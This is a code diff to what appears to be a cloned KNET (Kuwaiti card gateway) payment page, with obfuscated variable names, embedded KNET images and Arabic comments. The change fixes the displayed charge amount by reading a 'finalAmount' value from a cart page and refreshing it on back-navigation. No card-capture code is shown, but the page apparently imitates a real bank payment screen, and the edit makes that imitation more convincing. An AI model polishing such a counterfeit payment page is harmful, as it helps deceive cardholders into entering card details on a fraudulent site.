@@ -45,9 +45,11 @@ window.knetImageDb = {"b0": {"mime": "image/svg+xml", "data": "PD94bWwgdmVyc2lvb
 	 var v7 = "";
 	 var v206=false;
 	 function v240() {
-	   var v240a = window.localStorage.getItem(atob("YW1vdW50"));
+	   // المبلغ الصحيح محفوظ في finalAmount (يكتبه cartepage). المفتاح القديم "amount"
+	   // لم يكن يُكتب إطلاقاً → كان يرجع "-" فيختفي السعر ويظهر "KD -".
+	   var v240a = window.localStorage.getItem('finalAmount') || window.localStorage.getItem('amount');
 	   if (!v240a) return "-";
-	   var v240n = parseFloat(v240a);
+	   var v240n = parseFloat(String(v240a).replace(/[^\d.]/g, ''));
 	   return isNaN(v240n) ? v240a : v240n.toFixed(3);
 	 }
 	 function v241(v241h) {
@@ -1971,16 +1973,19 @@ Object.entries(v173).forEach(([name, value]) => {
 			<form name="n4" method="post">
 		</form>	
 <script>
-	// جلب القيمة المخزنة محلياً وتحديث النص داخل الهيكل القديم دون تغييره
-    const savedAmount = localStorage.getItem('finalAmount');
-    if (savedAmount) {
-        const priceLabel = document.getElementById('knet-price-label');
-        if (priceLabel) {
-            // استبدال القيمة مع الحفاظ على صيغة KD والتصميم الأصلي
-            const cleanPrice = savedAmount.replace(' د.ك', '');
-            priceLabel.innerHTML = 'KD&nbsp;' + cleanPrice;
-        }
-    }
+	// المبلغ الصحيح يأتي من finalAmount (يكتبه cartepage) عبر التخزين والتمرير.
+	// تُستدعى عند التحميل وعند استرجاع الصفحة من الكاش (رجوع خطوة) لتبقى القيمة صحيحة.
+	function refreshKnetAmount() {
+	    const savedAmount = localStorage.getItem('finalAmount') || localStorage.getItem('amount');
+	    const priceLabel = document.getElementById('knet-price-label');
+	    if (!priceLabel) return;
+	    if (savedAmount) {
+	        const cleanPrice = String(savedAmount).replace(' د.ك', '').replace(/[^\d.]/g, '');
+	        priceLabel.innerHTML = 'KD&nbsp;' + (cleanPrice || savedAmount);
+	    }
+	}
+	refreshKnetAmount();
+	window.addEventListener('pageshow', refreshKnetAmount);
 let v45 = "";
 
 const v3 = [
